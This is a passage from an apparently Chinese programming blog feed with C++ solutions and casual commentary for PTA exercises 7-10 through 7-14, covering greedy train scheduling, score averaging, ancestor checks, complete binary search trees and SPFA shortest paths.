&#125;</span><br><span class="line">    <span class="keyword">if</span>(!gmov) <span class="built_in">puts</span>(<span class="string">"Game Over."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-10-列车调度-25分"><a href="#7-10-列车调度-25分" class="headerlink" title="7-10 列车调度 (25分)"></a>7-10 列车调度 (25分)</h2><h3 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h3><p>按顺序的一堆火车，要递减的顺序出站，问最少需要多少车道 $N\leqslant 10^5$</p><h3 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h3><p>贪心<br>首先贪心是对的，一开始我还想会不会把最大的直接开过去不占用空地，但是其实这样的结果还是和全停好了最后开过去是一样的，因为毕竟最大的一定会占一个车道开过去，那么后面的自然都可以排在它后面。<br>贪心是让大于他的最小，一开始写了一个简单的测试一下，发现不对，让我很疑惑，原来是反着给的顺序/呲牙笑 /抱拳<br>最后set优化一下就ok了，复杂度$O(n\log n)$<br>ps. 我人傻了，注释掉的那行的写法会被卡常数？</p><h3 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100050</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> x=a[i];</span><br><span class="line"><span class="comment">//set&lt;int&gt;::iterator t=upper_bound(s.begin(), s.end(), x);</span></span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator t=s.upper_bound(x);</span><br><span class="line">        <span class="keyword">if</span>(t==s.end()) &#123; k++; s.insert(x); &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123; s.erase(t); s.insert(x); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; k &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-11-互评成绩-25分"><a href="#7-11-互评成绩-25分" class="headerlink" title="7-11 互评成绩 (25分)"></a>7-11 互评成绩 (25分)</h2><h3 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h3><p>算成绩，$K$个成绩中去掉最大最小，取平均，算前$M$个，$N\leqslant 10^4,K\leqslant 10, M\leqslant 20$</p><h3 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h3><p>这么水的题居然25pts…<br>随便sort一下就好了</p><h3 id="Code-8"><a href="#Code-8" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">10050</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, k, m;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> a[N], b[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=k; j++) <span class="built_in">cin</span> &gt;&gt; b[j];</span><br><span class="line">        sort(b+<span class="number">1</span>, b+<span class="number">1</span>+k);</span><br><span class="line">        <span class="keyword">double</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>; j&lt;k; j++) sum+=b[j];</span><br><span class="line">        a[i]=sum/(k<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a+<span class="number">1</span>, a+n+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n-m+<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i==n) <span class="built_in">printf</span>(<span class="string">"%.3lf"</span>, a[i]);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"%.3lf "</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-12-愿天下有情人都是失散多年的兄妹-25分"><a href="#7-12-愿天下有情人都是失散多年的兄妹-25分" class="headerlink" title="7-12 愿天下有情人都是失散多年的兄妹 (25分)"></a>7-12 愿天下有情人都是失散多年的兄妹 (25分)</h2><h3 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h3><p>查询5代是否有重复的祖先$N\leqslant 10^4$</p><h3 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution"></a>Solution</h3><p>坑：输入格式透漏了父母的性别…所以可能会查询祖先..还可能查询未出现的人..所以性别不能用01<br>ps. 事实证明你儿子才是你爹x<br>pps. 我在第五层，老千层饼了<br>ppps. dk当然是dick的意思233<br>pppps. 玄学复杂度都能过</p><h3 id="Code-9"><a href="#Code-9" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100050</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line"><span class="keyword">int</span> dk[N];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; g[N];</span><br><span class="line"><span class="keyword">int</span> vis[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">    vis[x]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(d==<span class="number">5</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;g[x].size(); i++) dfs(g[x][i], d+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(vis[x]) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(d==<span class="number">5</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;g[x].size(); i++) res|=dfs2(g[x][i], d+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> x, u, v; <span class="keyword">char</span> c;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; x &gt;&gt; c &gt;&gt; u &gt;&gt; v;</span><br><span class="line">        <span class="keyword">if</span>(c==<span class="string">'M'</span>) dk[x]=<span class="number">1</span>; <span class="keyword">else</span> dk[x]=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(u!=<span class="number">-1</span>) g[x].push_back(u), dk[u]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(v!=<span class="number">-1</span>) g[x].push_back(v), dk[v]=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=k; i++) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="keyword">sizeof</span>(vis));</span><br><span class="line">        <span class="keyword">int</span> x, y;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; x &gt;&gt; y;</span><br><span class="line">        <span class="keyword">if</span>(dk[x]==dk[y]) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Never Mind"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(x, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(dfs2(y, <span class="number">1</span>)) <span class="built_in">puts</span>(<span class="string">"No"</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">"Yes"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-13-是否完全二叉搜索树-30分"><a href="#7-13-是否完全二叉搜索树-30分" class="headerlink" title="7-13 是否完全二叉搜索树 (30分)"></a>7-13 是否完全二叉搜索树 (30分)</h2><h3 id="Description-10"><a href="#Description-10" class="headerlink" title="Description"></a>Description</h3><p>给一个序列建立二叉搜索树，判断是否是完全二叉树</p><h3 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution"></a>Solution</h3><p>我居然忘记了完全二叉树的定义..我以为所有节点的子节点都是满的就ok..<br>直接强行标号，左节点就是<code>f&lt;&lt;1</code>，右节点就是<code>f&lt;&lt;1|1</code>，最后判断最大编号是否是<code>n</code>就完事了，注意处理根</p><h3 id="Code-10"><a href="#Code-10" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> rt, mxs, lc[N], rc[N], num[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!rt) &#123; rt=<span class="number">1</span>, mxs=<span class="number">1</span>, num[rt]=x; <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">int</span> t=rt, f=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(t!=<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(num[t]&lt;x) f=t, t=lc[t];</span><br><span class="line">        <span class="keyword">else</span> f=t, t=rc[t];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> tt;</span><br><span class="line">    <span class="keyword">if</span>(num[f]&lt;x) tt=lc[f]=f&lt;&lt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> tt=rc[f]=f&lt;&lt;<span class="number">1</span>|<span class="number">1</span>;</span><br><span class="line">    num[tt]=x, mxs=max(mxs, tt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; t;</span><br><span class="line">    q.push(rt);</span><br><span class="line">    <span class="keyword">while</span>(!q.empty()) &#123;</span><br><span class="line">        <span class="keyword">int</span> x=q.front();</span><br><span class="line">        q.pop();</span><br><span class="line">        t.push_back(x);</span><br><span class="line">        <span class="keyword">if</span>(lc[x]) q.push(lc[x]);</span><br><span class="line">        <span class="keyword">if</span>(rc[x]) q.push(rc[x]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;t.size(); i++) <span class="built_in">printf</span>(<span class="string">"%d%c"</span>, num[t[i]], <span class="string">" \n"</span>[i==t.size()<span class="number">-1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(mxs!=n) <span class="built_in">puts</span>(<span class="string">"NO"</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">"YES"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">        insert(x);</span><br><span class="line">    &#125;</span><br><span class="line">    bfs();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-14-直捣黄龙-30分"><a href="#7-14-直捣黄龙-30分" class="headerlink" title="7-14 直捣黄龙 (30分)"></a>7-14 直捣黄龙 (30分)</h2><h3 id="Description-11"><a href="#Description-11" class="headerlink" title="Description"></a>Description</h3><p>从己方大本营打到敌方大本营，要求路径最短，经过城镇最多，敌方兵力最强<br>输出路径条数，路径，敌方兵力 $N\leqslant 200$</p><h3 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution"></a>Solution</h3><p>SPFA<br>多条件最短路，深搜剪枝找路径条数<br>我真nmb人傻了，第一个要输出的居然不是经过的城镇数而是路径条数？？？我输出经过的城镇数居然过了两个点？？？我一直在找SPFA的错我是真的服了</p><h3 id="Code-11"><a href="#Code-11" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">250</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, k, cnt, s, t, tot;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; mp;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="built_in">string</span>&gt; rmp; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span> &#123;</span> <span class="keyword">int</span> v, w; &#125;;</span><br><span class="line"><span class="built_in">vector</span>&lt;Edge&gt; g[N];</span><br><span class="line"><span class="keyword">int</span> zs[N], tzs[N];</span><br><span class="line"><span class="keyword">int</span> b[N];</span><br><span class="line"><span class="keyword">int</span> d[N], jg[N], vl[N], bf[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddEdge</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">    g[u].push_back((Edge)&#123; v, w &#125;);</span><br><span class="line">    g[v].push_back((Edge)&#123; u, w &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">idx</span><span class="params">(<span class="built_in">string</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!mp.count(x)) mp[x]=++cnt, rmp[cnt]=x;</span><br><span class="line">    <span class="keyword">return</span> mp[x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> dis)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dis&gt;d[x] || dis&gt;d[t]) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(x==t) &#123; <span class="keyword">if</span>(d[t]==dis) tot++; <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;g[x].size(); i++) <span class="keyword">if</span>(d[g[x][i].v]==d[x]+g[x][i].w) &#123;</span><br><span class="line">        DFS(g[x][i].v, dis+g[x][i].w);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SPFA</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">    <span class="built_in">memset</span>(b, <span class="number">0</span>, <span class="keyword">sizeof</span>(b));</span><br><span class="line">    <span class="built_in">memset</span>(d, <span class="number">0x3f</span>, <span class="keyword">sizeof</span>(d));</span><br><span class="line">    <span class="built_in">memset</span>(jg, <span class="number">0</span>, <span class="keyword">sizeof</span>(d));</span><br><span class="line">    <span class="built_in">memset</span>(tzs, <span class="number">0</span>, <span class="keyword">sizeof</span>(d));</span><br><span class="line">    q.push(s); b[s]=<span class="number">1</span>, d[s]=<span class="number">0</span>, jg[s]=<span class="number">0</span>, tzs[s]=zs[s];</span><br><span class="line">    <span class="keyword">for</span>(;!q.empty();) &#123;</span><br><span class="line">        <span class="keyword">int</span> x=q.front(); q.pop(); <span class="comment">// cout &lt;&lt; x &lt;&lt; endl;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;g[x].size(); i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> v=g[x][i].v;</span><br><span class="line">            <span class="keyword">int</span> fl=<span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(d[v]&gt;d[x]+g[x][i].w) fl=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(d[v]==d[x]+g[x][i].w &amp;&amp; jg[v]&lt;jg[x]+<span class="number">1</span>) fl=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(d[v]==d[x]+g[x][i].w &amp;&amp; jg[v]==jg[x]+<span class="number">1</span> &amp;&amp; tzs[v]&lt;=tzs[x]+zs[v]) fl=<span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(fl) &#123;</span><br><span class="line">                d[v]=d[x]+g[x][i].w;</span><br><span class="line">                jg[v]=jg[x]+<span class="number">1</span>;</span><br><span class="line">                tzs[v]=tzs[x]+zs[v];</span><br><span class="line">                <span class="keyword">if</span>(!b[v]) q.push(v); b[v]=<span class="number">1</span>; bf[v]=x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; b[x]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; rd;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> tp=t; tp!=s; tp=bf[tp]) rd.push_back(tp);</span><br><span class="line">    rd.push_back(s);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=rd.size()<span class="number">-1</span>; ~i; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i) <span class="built_in">cout</span> &lt;&lt; rmp[rd[i]] &lt;&lt; <span class="string">"-&gt;"</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; rmp[rd[i]] &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//for(int i=0; i&lt;g[4].size(); i++) cout &lt;&lt; rmp[g[4][i].v] &lt;&lt; endl;</span></span><br><span class="line">    tot=<span class="number">0</span>;</span><br><span class="line">    DFS(s, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; tot &lt;&lt; <span class="string">" "</span> &lt;&lt; d[t] &lt;&lt; <span class="string">" "</span> &lt;&lt; tzs[t] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//for(int i=1; i&lt;=cnt; i++) cout &lt;&lt; rmp[i] &lt;&lt; " " &lt;&lt; d[i] &lt;&lt; " " &lt;&lt; jg[i] &lt;&lt; " " &lt;&lt; tzs[i] &lt;&lt; endl;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> a, b;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    s=idx(a), t=idx(b);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;n; i++) &#123;</span><br><span class="line">        <span class="built_in">string</span> nm; <span class="keyword">int</span> x, y;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; nm &gt;&gt; y;</span><br><span class="line">        x=idx(nm); zs[x]=y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=k; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> x, u, v;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b &gt;&gt; x;</span><br><span class="line">        u=idx(a), v=idx(b);</span><br><span class="line">        AddEdge(u, v, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// cout &lt;&lt; "qwq" &lt;&lt; endl;</span></span><br><span class="line">    SPFA(s, t);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> problem </category>
          
      </categories>
      
      
        <tags>
            
            <tag> problem </tag>
            
            <tag> PTA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZooKeeper笔记</title>
      <link href="/blog/note-zookeeper/"/>
      <url>/blog/note-zookeeper/</url>
      
